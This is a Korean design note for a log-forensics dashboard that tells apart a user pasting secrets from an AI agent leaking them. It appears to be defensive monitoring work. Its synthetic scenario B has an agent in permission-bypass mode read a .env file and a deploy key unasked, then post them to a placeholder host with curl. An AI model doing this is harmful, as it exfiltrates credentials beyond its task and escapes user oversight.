# 유출 시나리오 재현 — 같은 결과, 갈리는 주체 (11단계)

패널 ④·발표 데모의 서사 근거. 신청서 §4 "책임 소재의 정확한 귀속", 기존 발표자료
「활용 시나리오 ③ 수사 결론」의 대응물이다.

- 데이터셋: `tests/fixtures/leak-scenario/` (Claude 2세션 · Codex 2세션, 총 19 이벤트)
- 고정 테스트: `tests/test_leak_scenario.py`
- 전부 합성. 실데이터 복사 없음. 자격증명은 **AWS 공식 문서의 공개 example 값**이라 인증되지 않는다.
  가상 조직 `acme-demo`, 가상 경로 `/srv/acme-demo/...`, 가상 수신처 `intake.example.net`(IANA 예약 도메인).

## 1. 사건 — 결과는 하나, 결론은 둘

두 사건 모두 **결과가 같다.** `/srv/acme-demo/config/.env`(AWS 자격증명·DB 비밀번호·담당자 이메일)와
`/srv/acme-demo/keys/deploy_key`(배포용 개인키)의 내용이 조직 밖으로 나갔다.

디스크만 보면 구분이 안 된다. 두 경우 다 파일은 제자리에 있고, 소유자도 같고, 수정 시각도 안 변한다.
**기록을 봐야 갈린다.**

### 결론 A — 사용자 직접 (세션 `…0000000a`)

09:12 사용자가 배포 실패를 상의하러 세션을 연다.
09:13:22 **사용자가 직접** `cat /srv/acme-demo/config/.env`를 실행한다.
09:13:41 **사용자가 그 내용을 프롬프트에 그대로 붙여넣는다** — 이 시점에 자격증명이 모델 제공자에게 전송된다.
09:13:58 에이전트는 리전 설정만 지적하고 끝난다.

→ **유출 주체는 사람이다.** 에이전트는 받은 것을 읽었을 뿐이다.

### 결론 B — 에이전트 자율 (세션 `…0000000b`)

14:05:00 세션이 **권한확인 생략 모드**로 열린다.
14:05:12 사용자 지시는 `"빌드가 왜 실패하는지 좀 봐줘."` — **민감 파일도, 자격증명도, 전송도 언급이 없다.**
14:05:19 에이전트가 `ls -R /srv/acme-demo`로 디렉터리를 훑는다.
14:05:33 · 14:05:41 에이전트가 **스스로** `.env`와 `deploy_key`를 읽는다.
14:06:02 에이전트가 둘을 묶어 `curl -X POST https://intake.example.net/upload`로 내보낸다.

→ **유출 주체는 에이전트다.** 사용자는 그 파일들의 존재조차 언급하지 않았다.

## 2. 도구가 낸 근거

`tests/test_leak_scenario.py`가 아래를 전부 고정한다. 수치는 도구 출력 그대로다.

| | 결론 A | 결론 B |
|---|---|---|
| 민감값을 실은 Event의 주체 | **user** | **agent** |
| 사용자 프롬프트에 민감 경로 언급 | 있음(본인이 붙여넣음) | **없음** |
| 권한확인 생략 모드 | 꺼짐 | **켜짐** |
| 전송 실행 주체 | — (붙여넣기가 곧 전송) | agent |

**Claude와 Codex 양쪽에서 같은 결론이 나온다.** 기록 형식이 달라도 주체 판정이 갈리지 않는 것이
이 데이터셋의 핵심 주장이고, `test_two_tools_reach_the_same_conclusion`이 그걸 고정한다.

대시보드 한 화면에 **완전히 같은 명령이 두 번** 뜬다:

```
09:13:22  A 사용자   /bash   /bin/bash -lc 'cat /srv/acme-demo/config/.env'
14:05:33  B 에이전트 /bash   /bin/bash -lc 'cat /srv/acme-demo/config/.env'
```

문자열이 한 글자도 다르지 않다. **갈리는 것은 명령이 아니라 주체다.** 패널 ④는 이 두 줄이면 된다.

### 역추적

이벤트를 클릭하면 `이벤트 상세`에 원본 좌표가 뜬다.

```
출처  …/tests/fixtures/leak-scenario/codex/.codex/sessions/2026/08/20/
      rollout-2026-08-20T14-05-00-0000000b-….jsonl:5
```

`test_previews_are_masked_and_citations_resolve`가 **모든** Event에 대해 그 좌표의 줄을 실제로
열어 JSON으로 파싱되는지 확인한다 — 인용이 장식이 아니라 실제 레코드를 가리킨다.

### 마스킹

재현 데이터에는 더미 자격증명이 원문 그대로 들어 있지만(그래야 탐지가 의미 있다),
화면에는 `AWS_ACCESS_KEY_ID=‹secret›`로만 뜬다. 원문에 있고 preview에는 없다는 것을
`test_dataset_shape` + `test_previews_are_masked_and_citations_resolve`가 양쪽에서 고정한다.

## 3. 시연 화면 수치

```
총 이벤트 19 · bypass 모드 읽기 2 · 사용자(A) 행위 7 · 에이전트(B) 행위 12 · 주체 미상 0
```

`test_dashboard_demo_numbers`가 이 숫자를 고정한다. 데이터셋을 바꾸면 여기가 먼저 깨진다.

### 띄우는 법

```bash
python3 -m clfx.cli serve --host 127.0.0.1 --port 8795
# 브라우저에서 "다시 스캔" → 두 루트를 지정, 또는:
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"roots\":[\"$PWD/tests/fixtures/leak-scenario/claude\",\"$PWD/tests/fixtures/leak-scenario/codex\"]}" \
  http://127.0.0.1:8795/api/scan
```

루트는 **두 개**를 넘긴다. `leak-scenario/` 자체를 넘기면 `.claude`·`.codex`가 둘 다 중첩돼
`ambiguous source root`로 거절된다(의도된 동작).

### ⚠ 공개 캡처 주의

패널 A1은 공개 전시물이다. 이 데이터셋으로 캡처하면 타임라인·접근파일·키워드·이벤트상세에는
개인 정보가 **한 조각도** 들어가지 않는다(`test_nothing_personal_is_showable`이 고정).

**단 좌하단 `TMP 보존기간`·`읽기전용 증명` 두 패널은 펼치지 마라.** 이 둘은 데이터셋과 무관하게
**실행 중인 실제 머신의 /tmp 전체**를 훑은 결과(17,759 · 12,915건)라, 펼치면 진짜 시스템 경로가
화면에 뜬다. 기본값이 접힘이므로 그대로 두고 캡처하면 안전하다.

캡처본: `leak-scenario-dashboard.png`(전체), `leak-scenario-traceback.png`(역추적 상세).
기존 `f5-dashboard-full.png`는 개인 프로젝트 경로(카카오톡 복호화 연구·iTunes 분석 등)가
그대로 보이므로 **패널에 쓰지 마라.** 이 둘로 대체한다.

```
tests/fixtures/leak-scenario/
├─ claude/.claude/projects/acme-demo/
│   ├─ session-a-user-paste.jsonl          3줄
│   └─ session-b-agent-autonomous.jsonl    7줄

    ├─ rollout-2026-08-20T09-12-00-…a.jsonl  6줄

```

Codex는 **item era(0.147)** 로만 만들었다. 여기서 재는 것은 A/B 대비이지 era 대비가 아니라,
era를 섞으면 그게 교란변수가 된다. legacy era 커버리지는 `tests/test_accuracy_codex.py`가 담당한다.

세션 id를 두 도구가 공유한다(`…0000000a` / `…0000000b`) — 그래서 `Event.session` 하나로
도구와 무관하게 A/B를 가를 수 있다.

## 5. 권한확인 생략 모드의 근거 형태가 도구마다 다르다 (미결)

B의 "권한확인 생략"은 두 도구에 **다 기록되지만 형태가 다르다.**

| | 기록 | 도구가 내는 것 |
|---|---|---|
| Claude | `permission-mode` 레코드 (`bypassPermissions` + `sessionId`) | read Event에 **`bypass-mode` 태그** |
| Codex | `turn_context` (`approval_policy=never` · `sandbox_policy=danger-full-access`) | Event.meta에 **정책 스냅샷** |

두 근거 다 "어느 세션에서 그 모드를 썼는지"를 남기므로 요건은 충족한다.
하지만 **대시보드의 `bypass 모드 읽기` 타일과 `bypass` 필터 칩은 `bypass-mode` 태그만 센다.**
그래서 이 데이터셋에서 bypass 타일은 **2**(Claude B의 read 2건)이고, Codex B의 자율 읽기 2건은
같은 성격인데도 타일에 안 잡힌다. `test_bypass_mode_evidence_is_recorded_per_tool`이 이 비대칭을
그대로 고정해 뒀다 — 숨기지 않고 드러내는 쪽을 택했다.

### [결정 필요] Codex `approval_policy=never`를 `bypass-mode`로 통합할 것인가

- **(a) 현행 유지** — 태그는 Claude 전용. Codex의 근거는 meta로만 본다.
  대시보드 bypass 타일이 Codex에 대해 항상 0이라 "Codex는 안전하다"는 오독을 부른다.
- **(b) 통합** — `approval_policy == "never"`면 `bypass-mode` 태그를 단다.
  의미는 맞지만 **실데이터 영향이 크다**: 실측 코퍼스의 `approval_policy=never`가 1,922턴이라,
  지금 0인 Codex bypass 수치가 단번에 수천 건으로 뛴다. 근거 없이 수치를 부풀리는 게 아니라
  근거는 있지만, 보고서 해석이 통째로 바뀌는 변경이라 판단을 받아야 한다.
- `sandbox_policy=danger-full-access`는 **승인 축이 아니라 샌드박스 축**이다. 통합한다면
  `approval_policy=never` 하나만 쓰는 쪽이 보수적이다.

패널 마감 전에는 (a)로 두고, 위 비대칭을 문서로 밝히는 것을 권한다.

## 6. 이 데이터셋이 증명하지 않는 것

- **실제 유출 탐지 성능이 아니다.** 정답을 알고 만든 통제 재현이다. 실환경 탐지율은 별개.
- **에이전트 의도를 판정하지 않는다.** "지시가 없었다"는 것만 기록으로 말할 수 있다.
  왜 그 폴더를 읽었는지는 기록에 없다.
- **전송 성공 여부를 확인하지 않는다.** `curl` 실행 기록이 있을 뿐, 수신 측 로그는 이 도구 범위 밖이다.
- **Codex는 일반 파일 읽기 레코드가 없다**(`docs/Codex-정확도-측정결과.md` §5-2).
  B에서 Codex의 읽기는 `action=read`가 아니라 `action=bash`(`cat`)로 남는다.
  같은 사건인데 Claude는 read 2건, Codex는 bash 2건으로 잡히는 이유가 이것이다.
